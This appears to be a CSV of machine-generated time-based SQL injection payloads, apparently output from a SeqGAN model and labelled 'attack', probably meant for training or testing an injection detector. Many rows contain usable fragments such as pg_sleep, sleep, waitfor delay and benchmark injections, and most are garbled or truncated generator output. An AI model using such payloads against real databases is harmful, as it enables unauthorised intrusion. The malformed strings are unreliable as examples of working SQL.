label,payload,family,payload_type,method,run_id,sample_index
attack,"1%%'||  (  select ':fq
98621""",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,290
attack,1    )   asor et sleep  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,291
attack,"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""3824'   )    or pg_sleep__TIMD5__TIME____  5   13612525,lreberr if where=  8036   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,292
attack,   select'waitfor or sleep  (sleep(  5   )    >or,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,293
attack,"""  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,294
attack,"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""ito'isintegratedsecurityonly'a   orsleep  (  (  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,295
attack,1'   )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,296
attack,   )    and    =  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,297
attack,;  sleep '0:0:2'  (  )   sleep  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,298
attack,1ws else --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,299
attack,1';select  elt  benchmarkl'0:0:__TIME__'sleep,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,300
attack,38850x694a4745hrn'   )    )    rlike sleep  (  5  )   and    (    (   'sineh'  (  )   or 2388___TIME________Telse--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,301
attack,   )    or pg_sleep  (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,302
attack,0r ; pg_sleep  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,303
attack,"',and   benchmark  (V  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,304
attack,"  where @vwhere'  3114lt,251361 ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,305
attack,' if --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,306
attack, #as  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,307
attack,"1'||  (  select '' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'elseifand        from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,308
attack,"""   )    or 4240  =    (  9443sleep  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,309
attack,waitfor _,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,310
attack,"    ),c,""a25isdetpolrp8140)   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,311
attack,"1""   )    or benchmark  (____--  select * * elt____  (  (___TIME_T__TIMDE_____TIM5____T#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,312
attack,"1""v""  )   rlike sleep  (  5  )   and   (  ""%'||  (  select ' 5466 delay not  (  5   )    or from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,313
attack,1   )    or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,314
attack, 7629scenot  =  (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,315
attack, if ll  (  )    select,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,316
attack,",""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,317
attack,"""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,318
attack,"1'||  (  select '   at""  =  ""    q' @t",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,319
attack,'   orsleep  (  3114 Dpg_sleep  (  5   )    s  =    )__)    select'   =msioirer0rriprtno(  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,320
attack,"1   )    or',   )    or  (  (  '  50000005  )    ,waitfor, k'0:0:2'* benchmark  ME____TIME____TIM___  5   6456    ))        whereor",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,321
attack,g not  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,322
attack,"1%a   C""   waitfor delay 42403885sv 0__  0x544d5a4c   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,323
attack,"1""   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,324
attack,elot  ___TIME____TIME___T__TTIME______TIME____((     --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,325
attack,"1%ect7629f' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'""   <>",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,326
attack,"1%%""aa",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,327
attack,;raksanr)   (  (   selecteeperoprpvru 4240i'sa' r or  (    TIMD5873   select not  (  sleep  (  _T5  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,328
attack,1       1   and 6793 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,329
attack,"""  3114  and pg_sleep  (  (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,330
attack,"siqi8  )   wherewaitforshven8594,delayl  6784  ,m)    or and'||  (  select 'selectm sleep  (  5),or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,331
attack,1   )   )   ori sleep  (  5   )       or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,332
attack,"""   select 4287  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,333
attack,""" or sleep  (  __TIME__  )    =  "" '0:0:2' '0:0:__TIME__'delay(  sleep",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,334
attack,"    5702,cdkdelaypcuadwaitfor",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,335
attack,1lo,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,336
attack,"j26570__  5873,5873  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,337
attack,"""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""oace1'   waitford and pg_sleep______--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,338
attack,"1   select 2388psleep  (  3114,(   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,339
attack,"1%'    ,m1zlerprsiieironselect pg_sleep--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,340
attack,") aiebte""  5ri ' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,341
attack,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""'1   )    or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,342
attack,',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,343
attack,"if if  sleep  (  (  5   )or not  (  5  ),8514",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,344
attack,"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""$i   )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,345
attack,1%   0x6d457153,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,346
attack,%'or,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,347
attack,"1'||  (  select 'sM8781:ak'enpn'and information_schemaifaaif n*ioahthen sleepa1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""ro@pinli1_<>Dpnr@iai""  =  ""rowhere pg_sleep5ooend  9862  5873  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,348
attack,1%'||  (  select '25j2388i5466ltpai waitfor where  (  benchmark  (   (  select delay 6969 not  1361  (  _____5  3114  sleep  (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,349
attack,1   )    or sleep  (  substring   and,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,350
attack,"; delay and    =_  5      )    where or pg_sleep  (,sleep  (  5   waitforwaitforaleisrhny(  5873  ),5  1361,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,351
attack,"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""% iertwherehclpt pg_sleep  (  3114  0x544d5a4c   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,352
attack,1'   )    ajp and et_______   pg_sleep  5   Du and pg_sleep   (  5   )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,353
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,354
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""0:Qa6969""  =  ""l;ifhsertop8(%",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,355
attack,' waitfor and   'enpn'* from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,356
attack,"""   waitfor6969 not  (  5dsdopiferor  ,0x76555642 delay_ if   )    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,357
attack,'    or like  amt ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,358
attack,1   )    a,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,359
attack,1i1%ru      <> waitforor pg_sleep  (   select ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,360
attack,"1""   )    )    or  sleep  0x544d5a4c5873  sleep  (  5ler  5  ,m",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,361
attack,"'   =  I,0",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,362
attack,bcs ey or aixve  )    )   waitfor --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,363
attack,   )    serzdodo waitfor,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,364
attack,""" or sleep  (  __TIME__  )    =  """"  31141   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,365
attack,' waitfor delay ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,366
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,367
attack, 8466  (  benchmark  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,368
attack,",10x76555642seiin  5p5  (  5,d5  (  )   and ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,369
attack,or pg_sleep  5   )  orand7260,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,370
attack,ba%sinekwaitfor  from   (  select   )    a   or  benchmark  )   waitforand  )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,371
attack,"1%,;brshv 0v:'enpn'dkreno alr0x6d457153veMyrs,zriwhereqeo from,M9862   (    2840   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,372
attack,";'||  (  select 'uo,xn0,)hwaitfort1 not  Dmerl  ,5  (  (  s  (  5   )    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,373
attack,1',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,374
attack,"1'||  (  select '%!1361 as where drveersvrt'  =  ' benchmark,5  (  5   )    or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,375
attack,"1'||  (  select '%%rcase'   )    )    rlike sleep  (  5  )   and    (    (   '""   )    )    or sleep  (  __TIME__  )    =  ""'||  (  select '' waitfor delay 'glq andisleep  select from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,376
attack,"Nn1l   or benchmark  sleep  not  _TIM___  (  __TIMt__T    )   5   )   likey poverp@inv;pkkkspnoaitsieat,ua""   waitfornotsleep  5(lTselect where delay (  5873   (  benchmark  md5  (  =   _TIMDm10   <> where 7629lrolerd5  (_  select   sleep  selectwhere from   (owaitfor sleep  (__TselectE____E___  5000000",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,377
attack,"; and pg_sleep(select   1361(  select 6784    =  substring elt '0:0:2' from benchmark(  )mor  T--f5873    =  _),----",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,378
attack,"""   as1waitforliken 6784 pg_sleep  (      --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,379
attack,1M9  )    ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,380
attack,"5873,7260",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,381
attack,1 y  D5  __T--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,382
attack,"""   )   ,0 )   <>  sleep  E____  benchmark    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,383
attack, --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,384
attack," 0esi(qs    t)   )   )    aor sleep  (  sleep  (_,md#  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,385
attack,"1%""  )   or sleep  (  __TIME__  )    =  ""a%%'||  (  select 'iq or ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,386
attack,"1   'isintegratedsecurityonly'""   waitforno'sa's 8594 y  =  (  __TIME___<_____TIME__TIMETIMEETI,ME________  6272  sleep  5  5)   )    )   or x______T--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,387
attack,"1%""  )    or sleep  sleep  E_____TIMDsleep  (  5873   (  5    )s where 6784 E      --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,388
attack,"1%%""Mcc5t  (  5000000_______T)  benchmark  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,389
attack,or*ssleep  (  )   and if ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,390
attack,'   )    )    rlike sleep  (  5  )   and    (    (   'when  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,391
attack,"1'   )    ,*)    and   )    ,7629pe",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,392
attack,"  6272,waitfors  )    ordt  (  3114--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,393
attack,1'||  (  select ''n) orlr  9862  select when  g,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,394
attack,"1%Z where delay 4240 waitfor from pg_sleep  E__  ,METIME___TIMp",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,395
attack, where 2388=  (  )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,396
attack,"1%""""   >    pwhere whereife  (  5873   6784--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,397
attack,1%%%',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,398
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,399
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""awaitfor  and sleep  (  ),#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,400
attack,   )    )   waitfor '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,401
attack,1'   or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,402
attack,1'||  (  select '<ipetoiy where  )    or delay @vEu_  (--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,403
attack,"' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||''1'   )    )    rlike sleep  (  5  )   and    (    (   'tst'   if wheret___  5  sleep  5   )    4240 '0:0:2' @verorbaredroel   (  )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,404
attack,'||  (  select '   77392388  (  and    (  5000000__53114#,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,405
attack,' ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,406
attack,";gdelay not,(   )     case",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,407
attack,   )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,408
attack,""" or delay26573114(  5  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,409
attack,'   )   or pg_sleep  (__  5   <>    :detenqdm,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,410
attack,"1%' waitfor delay '""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""4240sqyo1' if a  waitfor  6456 delay from  select '0:0:__TIME__' 0  aner'sa'c  (  2657   )    asivcr  0x544d5a4c  )   )    asecri6456 ifonu& where= et  '   )    )    rlike sleep  (  5  )   and    (    (   ''  5   or 8140 pg_sleep  5873  ,mi____  5000000525,d(  5000000,md,nodelayor not  sleep  (  ___TIME__TME____)  _T#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,411
attack,"""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""pwhere :oai=v  3885 4287  (    ( sleep   9862,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,412
attack,1    2where1%i8466ier50pr  5  (   )    )    select 4287  =  1   25    rea25=awaitfor where delay delay delay pg_sleep  substring   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,413
attack,"""   )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,414
attack,1 where 5466__________T--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,415
attack,1%'   )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,416
attack,"2657   )    and; '0:0:__TIME__'    =  (  m5  (  ,md5ME_________TIME__  10000000,m(  ___  _TIME__TIMD5  (   d5  (  0x544d5a4c   )    or 6793  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,417
attack,1 waitforei25oor'||  (  select ' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,418
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,419
attack,"; (sk"" like ""'   )    )    rlike sleep  (  5  )   and    (    (   '#l8594 '0:0:__TIME__'=  select  (  =_____T(    (  or 3885 from froml",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,420
attack,xiatde5  (  mdselectp'0:0:__TIME__'from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,421
attack,"1""   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,422
attack,"1   select not   select '0:0:2' "" or sleep  (  __TIME__  )    =  ""  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,423
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  """"  2388  =  3114--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,424
attack,1q'waitfor delay  * from --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,425
attack,'   g )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,426
attack,"""r  1%asioriq8)  or  (  5873,(  benchmark  10000000  (  sleep  5    ,  waitfors)    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,427
attack,'   (  select *  benchmark  p,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,428
attack,1    3885 where'||  (  select 'ls   not  (  5873dMpg_sleep  (  _  ()   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,429
attack,1'   25,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,430
attack,g sleep   u    ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,431
attack,"whereu')   or and""   5rets xe",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,432
attack,"Km:0wi0a   or 4287  3114  (  5000000,ME_____TIM)",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,433
attack," '  ,md  (  )   a",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,434
attack,"n1 3114,waitformrerteon2657   )    waitforall    _  )  or pg_sleep  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,435
attack,"1%M""  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,436
attack,"1""   )    ort",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,437
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""@{%%'(""sioor benchmark  (  5   or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,438
attack,"""   )    )    or sleep  (  __TIME__  )    =  "" and   andro--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,439
attack,"1%""  )   or sleep  (  __TIME__  )    =  ""k'0:0:2' sleep  (   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,440
